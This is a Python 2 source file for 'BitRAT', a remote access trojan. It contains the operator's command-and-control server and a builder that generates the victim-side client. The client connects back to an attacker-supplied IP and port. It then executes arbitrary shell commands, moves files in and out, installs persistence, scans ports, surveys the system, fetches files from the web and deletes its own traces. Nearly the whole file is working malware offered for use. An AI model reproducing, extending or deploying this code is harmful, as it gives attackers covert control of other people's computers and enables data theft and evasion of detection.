#!/usr/bin/env python
# -*- coding: utf-8 -*-
import commands
import argparse
import readline
import socket
import sys
import threading
import time
import os
from os.path import basename
from zipfile import ZipFile
from core import common
from core import crypto
import shutil
username = commands.getoutput("echo $(whoami)")
GEN = '''#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import sys
import common
import crypto
import persistence
import scan
import survey
import toolkit
HOST = '{}'
PORT = {}
def main():
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
    conn = socket.socket()
    conn.connect((HOST, PORT))
    client = common.Client(conn, HOST, 1)
    while True:
        results = ''
        data = client.recvGCM()
        if not data:
            continue
        cmd, _, action = data.partition(' ')

        if cmd == 'download':
            client.sendfile(action.rstrip())
            continue
        elif cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
        elif cmd == 'kill':
            conn.close()
            sys.exit(0)
        elif cmd == 'persistence':
            results = persistence.run(plat)
        # elif cmd == 'rekey':
        #    client.dh_key = crypto.diffiehellman(client.conn)
        #    continue
        elif cmd == 'scan':
            results = scan.single_host(action)
        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(plat)
        elif cmd == 'survey':
            results = survey.run(plat)
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
        elif cmd == 'upload':
            client.recvfile(action.rstrip())
            continue
        elif cmd == 'wget':
            results = toolkit.wget(action)
        client.sendGCM(results)

if __name__ == '__main__':
    main()'''
BANNER = '''  __QQ
 (_)_">
_)
'''
HELP_TEXT = '''
client <id>         - Connect to a client.
clients             - List connected clients.
download <file>     - Download a file.
execute <command>   - Execute a command on the target.
help                - Show this help menu.
kill                - Kill the client connection.
persistence         - Apply persistence mechanism.
quit                - Exit the server and end all client connections.
scan <ip>           - Scan top 25 ports on a single host.
selfdestruct        - Remove all traces of the RAT from the target system.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <file>       - Upload a file.
wget <url>          - Download a file from the web.
gen                 - Generate RAT'''
COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
             'unzip', 'upload', 'wget', 'gen' ]
class Server(threading.Thread):
    clients      = {}
    alive        = True
    client_count = 1
    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)
    def run(self):
        while True:
            conn, addr = self.s.accept()
            client_id = self.client_count
            client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1
    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except (KeyError, ValueError):
            return None
    def get_clients(self):
        return [v for k,v in self.clients.iteritems() if v.alive]
    def remove_client(self, key):
        return self.clients.pop(key, None)
class ClientConnection(common.Client):
    alive = True
    def send(self, prompt):
        if not self.alive:
            print 'Error: Client not connected.'
            return
        cmd, _, action = prompt.partition(' ')
        if cmd == 'selfdestruct':
            if raw_input('Remove all traces of BitRAT from the target ' \
                         'system (y/N)? ').startswith('y'):
                print 'Running selfdestruct...'
                self.sendGCM(prompt)
                self.conn.close()
            return
        self.sendGCM(prompt)
        self.conn.settimeout(1)
        if cmd == 'kill':
            self.conn.close()
        elif cmd == 'download':
            self.recvfile(action.rstrip())
        elif cmd == 'upload':
            self.sendfile(action.rstrip())
        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
            print 'Running {}...'.format(cmd)
            recv_data = self.recvGCM().rstrip()
            print recv_data
def get_parser():
    parser = argparse.ArgumentParser(description='BitRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser
def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    client  = None
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'Listening for connections on port {}.'.format(port)
    while True:
        try:
            promptstr = '\n[{}] BitRAT> '.format(client.uid)
        except AttributeError:
            promptstr = '\n[{}] BitRAT> '.format('?')
        prompt = raw_input(promptstr).rstrip()
        if not prompt:
            continue
        cmd, _, action = prompt.partition(' ')
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue
        if cmd == 'help':
            print HELP_TEXT
        if cmd == 'gen':
            print ''
            gen_ip = raw_input ('Remote IP >> ')
            gen_port = input ('Remote Port >> ')
            output_filename = raw_input ('Client Name >> ')
            print ''
            f = open("./core/__main__.py", "w")
            f.write(GEN.format(gen_ip,gen_port))
            f.close()
            shutil.make_archive('/home/'+username+'/Desktop/' + output_filename, 'zip', './core')
            os.system("echo '#!/usr/bin/env python' | cat - /home/"+username+"/Desktop/" + output_filename + ".zip > /home/"+username+"/Desktop/" + output_filename)
            print 'Run via "python %s"'%(output_filename)
            print 'Client saved to /home/'+username+'/Desktop/ -> %s'%(output_filename)
            os.system('rm /home/'+username+'/Desktop/'+output_filename+'.zip')
            exit(0)
        elif cmd == 'quit':
            if raw_input('Exit the server and end all client connections ' \
                         '(y/N)? ').startswith('y'):
                sys.exit(0)
        elif cmd == 'client':
            new_client = server.select_client(action)
            if new_client:
                client = new_client
                print 'Client {} selected.'.format(client.uid)
            else:
                print 'Error: Invalid Client ID'
        elif cmd == 'clients':
            print 'ID - Client Address'
            for k in server.get_clients():
                print '{:>2} - {}'.format(k.uid, k.addr[0])
        if cmd in ['client', 'clients', 'help', 'quit']:
            continue
        if not client:
            print 'Error: Invalid client ID.'
            continue
        try:
            client.send(prompt)
        except (socket.error, ValueError) as e:
            print e
            print 'Client {} disconnected.'.format(client.uid)
            cmd = 'kill'
        if cmd in ['kill', 'selfdestruct']:
            server.remove_client(client.uid)
            client = None


if __name__ == '__main__':
    main()
